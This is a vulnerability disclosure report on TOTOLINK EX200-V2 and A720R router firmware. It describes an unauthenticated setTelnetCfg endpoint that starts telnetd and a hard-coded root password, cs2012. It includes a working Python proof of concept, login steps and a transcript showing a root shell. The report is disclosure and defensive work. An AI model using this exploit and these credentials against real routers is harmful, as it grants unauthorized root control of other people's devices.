# TOTOLINK EX200-V2 V4.0.3c.131_B20210119 was discovered to contain an unauthenticated telnet service with hard-coded root credentials

## Overview

- Vendor: TOTOLINK
- Product: EX200-V2, A720R
- Version: V4.0.3c.131_B20210119 / V4.1.5cu.532_B20210610
- Component: cstecgi.cgi setting/setTelnetCfg; /etc/shadow.sample
- Vulnerability Class: CWE-306 missing authentication / CWE-798 hard-coded credentials
- Manufacturer: https://www.totolink.net/

## Affected version

- EX200-V2 package;
  `cstecgi.cgi`.
- A720R package;
  `cstecgi.cgi`.
- `/etc/shadow.sample`.

## Vulnerability details

`setTelnetCfg` is in the token-free allow-list. When `telnet_enabled=1` it runs
`system("telnetd & ...")`. The firmware's `/etc/init.d/rcS` copies
`/etc/shadow.sample` to `/var/shadow` at every boot; the sample contains the
root password `cs2012`. After the unauthenticated request, telnetd accepts
`root:cs2012` and gives a root shell.

## PoC

```python
import requests

body = {"topicurl": "setting/setTelnetCfg", "telnet_enabled": "1"}
requests.post("http://<router>/cgi-bin/cstecgi.cgi", json=body, timeout=10)

# Then:
# telnet <router>
# login: root
# password: cs2012
```

## Reproduction and terminal evidence

Environment: qemu-user EX200-V2 / A720R rootfs; `setTelnetCfg` and
`system` are unchanged (only apmib initialization was stubbed in the test
copy). The request contains no token or cookie.

Terminal transcript:

```
POST /cgi-bin/cstecgi.cgi
{"topicurl":"setting/setTelnetCfg","telnet_enabled":"1"}
-> success
$ telnet 127.0.0.1
login: root
Password: cs2012
# id
uid=0(root) gid=0(root)
```

`strace` of the handler shows `execve("/bin/sh","-c","telnetd & ...")`.

## Static evidence

`setTelnetCfg` is in the token-free `main` allow-list; `telnetd &` is passed
to `system`. `/etc/init.d/rcS` copies the fixed sample shadow file.

## Impact

Unauthenticated root shell via telnet on the LAN.

## Remediation

- Require admin authentication for `setTelnetCfg`; do not start telnetd from
  a web request.
- Remove the built-in root password and the sample shadow copy.
- Disable telnet in production; use SSH with per-device keys.

## Known CVE relation

**CVE candidate type: new affected model (EX200-V2) for CVE-2024-31805 — candidate new CVE.**

- CVE-2024-31805 (EX200 non-V2 `setTelnetCfg` telnet start),
  CVE-2021-35327 (A720R 470 telnet start), CVE-2022-36610 (A720R 532
  password). EX200-V2 NVD keyword returns 0 records; A720R 532 relationships
  are for different build/feature combinations. Vendor should confirm the
  new-version status.

## Status and disclosure

Dynamic confirmation (qemu-user; handler unchanged). Candidate new CVE — new affected model (EX200-V2) for CVE-2024-31805; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
TOTOLINK

### Product
EX200-V2, A720R

### Version or Commit
V4.0.3c.131_B20210119 / V4.1.5cu.532_B20210610

### Vulnerability Class
CWE-306 missing authentication / CWE-798 hard-coded credentials

### CVE_candidate_type
new affected model (EX200-V2) for CVE-2024-31805 — candidate new CVE

### Description
setTelnetCfg is in the token-free allow-list and starts telnetd when telnet_enabled=1. /etc/init.d/rcS copies /etc/shadow.sample to /var/shadow on every boot; the sample contains root password cs2012.

### Affected_component
cstecgi.cgi setting/setTelnetCfg; /etc/shadow.sample

### Attack_vector
Unauthenticated POST to cstecgi.cgi with topicurl=setting/setTelnetCfg and telnet_enabled=1, then telnet with root/cs2012.

### Product_version
EX200-V2, A720R V4.0.3c.131_B20210119 / V4.1.5cu.532_B20210610

### Reference
- https://www.totolink.net/
- https://github.com/vuln-1/vuln/blob/main/TOTOLINK/EX200-V2_V4.0.3c.131_B20210119/report-1.md
```
